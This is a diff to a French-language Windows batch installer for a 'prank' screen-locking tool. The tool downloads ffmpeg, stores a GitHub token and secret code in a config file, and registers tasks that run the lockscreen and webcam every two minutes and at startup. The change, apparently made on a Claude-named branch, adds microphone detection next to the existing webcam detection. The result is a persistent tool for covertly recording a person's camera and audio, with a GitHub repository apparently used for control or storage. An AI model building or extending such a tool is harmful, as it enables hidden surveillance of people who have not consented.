@@ -12,7 +12,7 @@ set TOKEN=REMPLACER_PAR_TON_TOKEN_GITHUB
 set CODE_SECRET=REMPLACER_PAR_TON_CODE_SECRET
 set OWNER=thesangu
 set REPO=Aventuuuure
-set BRANCH=main
+set BRANCH=claude/signature-prank-replace-xhom2n
 set DOSSIER=%APPDATA%\BlagueVerrou
 
 set PS_LOCK=%DOSSIER%\blague_lock_windows.ps1
@@ -44,15 +44,28 @@ powershell -Command ^
    Expand-Archive '$env:TEMP\ffmpeg.zip' -DestinationPath '$env:TEMP\ffmpeg_ext' -Force; ^
    Copy-Item (Get-ChildItem '$env:TEMP\ffmpeg_ext' -Filter 'ffmpeg.exe' -Recurse | Select-Object -First 1).FullName '%FFMPEG%'"
 
-echo [3/4] Detection de la webcam...
-for /f "delims=" %%C in ('powershell -Command ^
-  "& '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1 | Select-String '\\\".*\\\"' | Select-Object -First 1 | ForEach-Object { $_.Matches.Value.Trim('\"') }"') do set CAMERA=%%C
+echo [3/4] Detection des peripheriques audio/video...
+powershell -Command ^
+  "$devices = & '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1; ^
+   $videoLine = $devices | Select-String '\\\".*\\\"' | Select-Object -First 1; ^
+   if ($videoLine) { $videoLine.Matches.Value.Trim('\"') } else { '' }" > "%TEMP%\cam_name.txt"
+set /p CAMERA=<"%TEMP%\cam_name.txt"
+
+powershell -Command ^
+  "$devices = & '%FFMPEG%' -list_devices true -f dshow -i dummy 2>&1; ^
+   $inAudio = $false; ^
+   foreach ($line in $devices) { ^
+     if ($line -match 'DirectShow audio') { $inAudio = $true; continue } ^
+     if ($inAudio -and $line -match '\\\"(.+?)\\\"') { $Matches[1]; break } ^
+   }" > "%TEMP%\mic_name.txt"
+set /p MIC=<"%TEMP%\mic_name.txt"
 
 echo     Webcam detectee : %CAMERA%
+echo     Micro detecte   : %MIC%
 
 echo [4/4] Ecriture de la configuration...
 powershell -Command ^
-  "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';webapp_url='%WEBAPP_URL%'}; ^
+  "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';mic_name='%MIC%';webapp_url='%WEBAPP_URL%'}; ^
    $c | ConvertTo-Json | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"
 
 :: Taches planifiees (lockscreen + webcam + listing, tous les 2min + au demarrage)
